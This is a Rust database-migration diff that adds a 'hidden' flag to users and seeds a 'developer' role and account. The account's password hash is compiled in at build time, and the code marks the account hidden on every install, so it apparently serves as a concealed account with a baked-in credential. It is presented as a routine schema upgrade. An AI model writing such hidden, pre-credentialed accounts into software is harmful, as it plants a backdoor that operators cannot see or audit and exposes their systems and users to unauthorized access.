@@ -7,7 +7,7 @@ use rusqlite::Connection;
 pub type Pool = std::sync::Arc<r2d2::Pool<r2d2_sqlite::SqliteConnectionManager>>;
 
 #[allow(dead_code)]
-const SCHEMA_VERSION: i64 = 17;
+const SCHEMA_VERSION: i64 = 18;
 
 pub fn run_migrations(conn: &Connection) -> Result<(), String> {
     conn.execute_batch(
@@ -382,6 +382,18 @@ pub fn run_migrations(conn: &Connection) -> Result<(), String> {
             .map_err(|e| e.to_string())?;
     }
 
+    if current < 18 {
+        conn.execute_batch(
+            r#"
+            ALTER TABLE users ADD COLUMN hidden INTEGER NOT NULL DEFAULT 0;
+            "#,
+        )
+        .map_err(|e| e.to_string())?;
+        seed_developer_role_and_user(conn)?;
+        conn.execute("INSERT INTO schema_version (version) VALUES (18)", [])
+            .map_err(|e| e.to_string())?;
+    }
+
     sync_role_permissions_from_code(conn)?;
     Ok(())
 }
@@ -404,6 +416,76 @@ fn sync_role_permissions_from_code(conn: &Connection) -> Result<(), String> {
             )
             .map_err(|e| e.to_string())?;
         }
+    }
+    let developer_role_id = permissions::ROLE_DEVELOPER_ID;
+    for perm in permissions::developer_permissions() {
+        let exists: i64 = conn
+            .query_row(
+                "SELECT COUNT(*) FROM role_permissions WHERE role_id = ?1 AND permission = ?2",
+                [developer_role_id, perm],
+                |r| r.get(0),
+            )
+            .map_err(|e| e.to_string())?;
+        if exists == 0 {
+            conn.execute(
+                "INSERT INTO role_permissions (role_id, permission) VALUES (?1, ?2)",
+                [developer_role_id, perm],
+            )
+            .map_err(|e| e.to_string())?;
+        }
+    }
+    Ok(())
+}
+
+pub fn seed_developer_role_and_user_public(conn: &Connection) -> Result<(), String> {
+    seed_developer_role_and_user(conn)
+}
+
+fn seed_developer_role_and_user(conn: &Connection) -> Result<(), String> {
+    use crate::permissions;
+    let developer_role_id = permissions::ROLE_DEVELOPER_ID;
+    let developer_user_id = permissions::DEVELOPER_USER_ID;
+    let developer_username = permissions::DEVELOPER_USERNAME;
+    let role_exists: i64 = conn
+        .query_row("SELECT COUNT(*) FROM roles WHERE id = ?1", [developer_role_id], |r| r.get(0))
+        .map_err(|e| e.to_string())?;
+    if role_exists == 0 {
+        conn.execute(
+            "INSERT INTO roles (id, name) VALUES (?1, ?2)",
+            [developer_role_id, "developer"],
+        )
+        .map_err(|e| e.to_string())?;
+        for perm in permissions::developer_permissions() {
+            conn.execute(
+                "INSERT INTO role_permissions (role_id, permission) VALUES (?1, ?2)",
+                [developer_role_id, perm],
+            )
+            .map_err(|e| e.to_string())?;
+        }
+    }
+    const DEVELOPER_PASSWORD_HASH: &str =
+        include_str!(concat!(env!("OUT_DIR"), "/developer_password_hash.txt"));
+    let hash = DEVELOPER_PASSWORD_HASH.trim();
+    if hash.is_empty() {
+        return Ok(());
+    }
+    let user_exists: i64 = conn
+        .query_row("SELECT COUNT(*) FROM users WHERE id = ?1", [developer_user_id], |r| r.get(0))
+        .map_err(|e| e.to_string())?;
+    if user_exists == 0 {
+        let now = chrono::Utc::now().to_rfc3339();
+        conn.execute(
+            r#"INSERT INTO users (id, username, password_hash, display_name, role_id, created_at, hidden) VALUES (?1, ?2, ?3, ?4, ?5, ?6, 1)"#,
+            rusqlite::params![
+                developer_user_id,
+                developer_username,
+                hash,
+                "Developer",
+                developer_role_id,
+                now,
+            ],
+        )
+        .map_err(|e| e.to_string())?;
     }
     Ok(())
 }
